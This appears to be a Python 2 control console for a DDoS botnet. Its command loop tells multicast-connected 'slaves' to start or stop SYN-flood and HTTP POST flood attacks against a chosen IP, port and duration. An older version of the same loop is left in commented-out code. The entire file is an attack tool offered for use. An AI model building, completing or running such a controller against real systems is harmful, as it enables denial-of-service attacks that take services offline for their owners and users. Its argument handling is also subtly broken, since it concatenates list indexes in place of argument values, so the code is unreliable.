import socket
import signal
from multicastsender import *
from cmd import Cmd

class my_prompt(Cmd):

    def __init__(self):
        Cmd.__init__(self)
        self.prompt = '> '
        self.sock = configMulticastSock()
        signal.signal(signal.SIGTSTP, self.handler)

    def handler(self, signum, frame):
        self.do_exit('')

    def default(self, line):
        print "Invalid command. Try help for more information"

    def do_exit(self, args):
        """Close possible ongoing attacks and exit the program"""
        print "Closing possible ongoing attacks..."
        sendMsgToSlaves("syn-flood;stop", self.sock)
        sendMsgToSlaves("http-post;stop", self.sock)

        self.sock.close()
        raise SystemExit

    def do_syn_flood(self, args):
        """Compulsory flags to begin an attack:
                -port <[int] destination port>
                -ip <[ipv4] destination ip>
                -n <[int] number of attacking units>"""
        args = args.split(' ')
        error = False

        if len(args) > 0:
            if '-start' in args:
                body = 'syn-flood;start;'

                if '-n' in args:
                    iN = args.index('-n') + 1
                    body += iN + ';'
                else:
                    error = True
                if '-port' in args:
                    iPort = args.index('-port') + 1
                    body += iPort + ';'
                else:
                    error = True
                if '-ip' in args:
                    iIP = args.index('-ip') + 1
                    body += iIP
                else:
                    error = True
                if '-time' in args:
                    i = args.index('-time') + 1
                    body += ";" + args[i]

            elif '-stop' in args:
                body = 'syn-flood;stop'
            else:
                error = True
        else:
            error = True

        if error:
            print "Invalid command. Try help for more information"
        else:
            sendMsgToSlaves(body, self.sock)


    def do_http_post(self, args):
        """Compulsory flags to begin an attack:
        -port <[int] destination port>
        -ip <[ipv4] destination ip>
        -n <[int] number of attacking units>"""
        args = args.split(' ')
        error = False

        if len(args) > 0:
            if '-start' in args:
                body = 'http-post;start;'

                if '-n' in args:
                    iN = args.index('-n') + 1
                    body += iN + ';'
                else:
                    error = True
                if '-port' in args:
                    iPort = args.index('-port') + 1
                    body += iPort + ';'
                else:
                    error = True
                if '-ip' in args:
                    iIP = args.index('-ip') + 1
                    body += iIP
                else:
                    error = True
                if '-time' in args:
                    i = args.index('-time') + 1
                    body += ";" + args[i]

            elif '-stop' in args:
                body = 'http-post;stop'
            else:
                error = True
        else:
            error = True

        if error:
            print "Invalid command. Try help for more information"
        else:
            sendMsgToSlaves(body, self.sock)

def readInputLine():
    line = raw_input("> ")
    line = line.lower()
    return line.split(' ')

def printHelp():
    print "Please inform <attack type> <flags>"
    print "\nValid attack types:"
    print "    syn-flood"
    print "    http-post"
    print "\n Compulsory flags to begin an attack:"
    print "    -port <[int] destination port>"
    print "    -ip <[ipv4] destination ip>"
    print "    -n <[int] number of attacking units>"
    print "\n Necessary flags:"
    print "    -start"
    print " or"
    print "    -stop"
    print "\n Flag:"
    print "    -time <[int] attack period in seconds>"
    print "\n Exit"
    print "    exit()"

def getArgs(words):
    iN = words.index('-n') + 1
    int(words[iN])

    iPort = words.index('-port') + 1
    int(words[iPort])

    iIP = words.index('-ip') + 1
    socket.inet_pton(socket.AF_INET, words[iIP])

    return words[iN] + ";" + words[iPort] + ";" +  words[iIP]

################################### MAIN ####################################### 
if __name__ == '__main__':

    prompt = my_prompt()
    prompt.cmdloop('===== Welcome to DDOS Attacker=====\nPlease command your attack or try help for more information')
    # sock = configMulticastSock()

    # print "===== Welcome to DDOS Attacker====="
    # print "Please command your attack or try --help for more information"

    # try:
    #     while 1:
    #         words = readInputLine()
    #         if len(words[0]) == 0:
    #             continue
    #
    #         if '--help' in words:
    #             printHelp()
    #             continue
    #         if 'exit()' in words:
    #             break
    #
    #         if '-start' in words:
    #             try:
    #                 if 'syn-flood' in words:
    #                     body = 'syn-flood;start;'
    #                 elif 'http-post' in words:
    #                     body = 'http-post;start;'
    #                 else:
    #                     print "Invalid command. Try --help for more information"
    #                     continue
    #                 body += getArgs(words)
    #                 if '-time' in words:
    #                     i = words.index('-time') + 1
    #                     int(words[i])
    #                     body += ";" + words[i]
    #
    #                 sendMsgToSlaves(body, sock)
    #             except:
    #                 print "Invalid flag(s). Try --help for more information"
    #                 continue
    #         elif '-stop' in words:
    #             if 'syn-flood' in words:
    #                 body = 'syn-flood;stop'
    #             elif 'http-post' in words:
    #                 body = 'http-post;stop'
    #             else:
    #                 print "Invalid command. Try --help for more information"
    #                 continue
    #             sendMsgToSlaves(body, sock)
    #         else:
    #             print "Missing necessary flag. Try --help for more information"
    # except KeyboardInterrupt:
    #     print "\nKeyboard interruption detected"
    #
    # print "Closing possible ongoing attacks..."
    # sendMsgToSlaves("syn-flood;stop", sock)
    # sendMsgToSlaves("http-post;stop", sock)
    #
    # sock.close()

